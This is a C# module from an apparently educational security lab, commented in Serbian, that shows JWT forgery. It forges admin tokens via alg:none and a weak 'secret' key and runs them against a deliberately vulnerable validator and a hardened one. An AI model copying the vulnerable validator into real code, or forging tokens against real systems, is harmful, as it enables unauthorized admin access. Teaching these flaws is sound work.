using System.Text.Json;
using SecurityLab.Api.Infrastructure;

namespace SecurityLab.Api.Attacks.Jwt;

/// <summary>
/// NAPAD #4: JWT eksploatacija (automatizovani alat).
///
/// Token nosi "role" i server po njemu odlučuje da li si admin. Ako server loše proverava
/// potpis, napadač može sam da iskuje admin token.
///
/// Alat (endpoint /attack) automatski proba dve klasične forge tehnike. Prva je alg:none,
/// token bez potpisa kome server koji prihvata "none" naivno veruje. Druga je slab ključ,
/// HS256 potpisan sa "secret" (čest default i slab ključ).
///
/// Ranjivi validator prihvata alg:none i koristi slab ključ "secret". Bezbedni validator
/// zahteva HS256, jak ključ i proveru potpisa (uz iss/exp).
/// </summary>
public sealed class JwtModule : IAttackModule
{
    private const string WeakSecret = "secret";
    private const string StrongSecret = "G7!kP2$wq9_Zx4r8Lm1Nv6Tb3Hy0Qe5";

    public AttackMeta Meta => new(
        Id: "jwt",
        Number: 4,
        Title: "JWT eksploatacija (alat)",
        Category: "Auth",
        Summary: "Automatsko kovanje admin tokena (alg:none, slab ključ). Bezbedna grana zahteva jak HS256 potpis.");

    public void Map(RouteGroupBuilder group)
    {
        group.MapGet("/vulnerable/attack", () => RunAttack(secure: false));
        group.MapGet("/secure/attack", () => RunAttack(secure: true));
    }

    private static IResult RunAttack(bool secure)
    {
        var steps = new List<object>();

        // 1) Legitiman korisnički token (role=user) koji bi server inače izdao.
        var userToken = Jwt.Encode(
            new() { ["sub"] = "alice", ["role"] = "user", ["iss"] = "security-lab" },
            "HS256", secure ? StrongSecret : WeakSecret);
        steps.Add(new { step = "1. Uhvaćen korisnički token", token = userToken, role = "user" });

        // 2) Alat kuje admin tokene (napadač uopšte ne zna tajni ključ).
        var forgeNone = Jwt.Encode(
            new() { ["sub"] = "alice", ["role"] = "admin", ["iss"] = "security-lab" }, "none", null);
        var forgeWeak = Jwt.Encode(
            new() { ["sub"] = "alice", ["role"] = "admin", ["iss"] = "security-lab" }, "HS256", WeakSecret);
        steps.Add(new { step = "2. Iskovan token: alg=none", token = forgeNone });
        steps.Add(new { step = "3. Iskovan token: HS256 + slab ključ 'secret'", token = forgeWeak });

        // 3) Probamo iskovane tokene na validatoru.
        var r1 = Validate(forgeNone, secure);
        var r2 = Validate(forgeWeak, secure);
        steps.Add(new { step = "4. Provera alg=none tokena", accepted = r1.ok, role = r1.role, reason = r1.reason });
        steps.Add(new { step = "5. Provera slab-ključ tokena", accepted = r2.ok, role = r2.role, reason = r2.reason });

        var adminGranted = (r1.ok && r1.role == "admin") || (r2.ok && r2.role == "admin");

        return Results.Json(new
        {
            mode = secure ? "secure" : "vulnerable",
            blocked = secure && !adminGranted,
            adminAccessGranted = adminGranted,
            steps,
            message = adminGranted
                ? "USPEO NAPAD: iskovani admin token je prihvaćen, napadač je sada admin!"
                : "Napad odbijen: nijedan iskovani token nije prošao validaciju potpisa."
        }, statusCode: (secure && !adminGranted) ? 200 : 200);
    }

    private static (bool ok, string? role, string reason) Validate(string token, bool secure)
    {
        try
        {
            var (header, payload, sig, signingInput) = Jwt.Decode(token);
            var alg = header.TryGetValue("alg", out var a) ? a.GetString() : null;
            var role = payload.TryGetValue("role", out var r) ? r.GetString() : null;

            if (secure)
            {
                // Bezbedno: samo HS256 sa jakim ključem i ispravnim potpisom.
                if (alg != "HS256") return (false, null, $"Odbijen alg '{alg}' (dozvoljen samo HS256).");
                if (!Jwt.VerifyHs256(signingInput, sig, StrongSecret))
                    return (false, null, "Potpis ne odgovara (pogrešan/nepoznat ključ).");
                return (true, role, "Validan potpis.");
            }
            else
            {
                // Ranjivo: prihvata 'none' i koristi slab ključ.
                if (alg == "none") return (true, role, "Prihvaćen alg=none (BEZ provere potpisa!).");
                if (alg == "HS256" && Jwt.VerifyHs256(signingInput, sig, WeakSecret))
                    return (true, role, "Validan potpis (ali ključ je slab: 'secret').");
                return (false, null, "Potpis ne odgovara.");
            }
        }
        catch (Exception ex)
        {
            return (false, null, "Neispravan token: " + ex.Message);
        }
    }
}
